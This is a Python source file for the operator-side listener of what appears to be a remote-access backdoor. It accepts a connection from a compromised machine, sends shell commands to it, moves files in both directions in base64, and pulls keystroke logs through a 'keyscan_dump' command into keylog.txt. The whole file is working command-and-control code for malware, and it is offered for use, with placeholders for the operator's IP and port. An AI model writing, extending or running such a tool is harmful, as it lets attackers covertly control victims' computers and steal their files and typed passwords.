import socket, json, base64


class Listener:

    def __init__(self, ip, port):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.conn.bind((ip, port))
        self.conn.listen(0)
        print("[+] listener started on {}:{}".format(ip, port))
        self.connection, address = self.conn.accept()
        print("[+] connection received from {}".format(address))

    def send(self, data):
        json_data = json.dumps(data)
        try:
            self.connection.send(json_data.encode())
        except BrokenPipeError:
            print("[-] Connection is broken.")
            exit(0)

    def receive(self):
        json_result = ''
        while True:
            try:
                json_result += self.connection.recv(1024).decode()
                result = base64.b64decode(json.loads(json_result).encode()).decode()
                return result
            except ValueError:
                continue

    def download_file(self, data, path):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(data))
            return "[+] File downloaded."

    def upload_file(self, path):
        try:
            with open(path, 'rb') as file:
                return base64.b64encode(file.read())
        except:
            return b"[-] File not found."

    def run(self):
        while True:
            try:
                data = input(">>")
                if data.split(' ')[0] == 'upload':
                    content = self.upload_file(data.split(' ')[1])
                    data = data + ' ' + content.decode()
                self.send(data)
                result = self.receive()
                if data.split(' ')[0] == 'download':
                    result = self.download_file(result,data.split(' ')[1])
                if data.split(' ')[0] == 'keyscan_dump':
                    result = self.download_file(result, 'keylog.txt')
                print(result)
            except KeyboardInterrupt:
                self.send("exit")
                exit(0)


listener = Listener('Your_IP', Port)
listener.run()
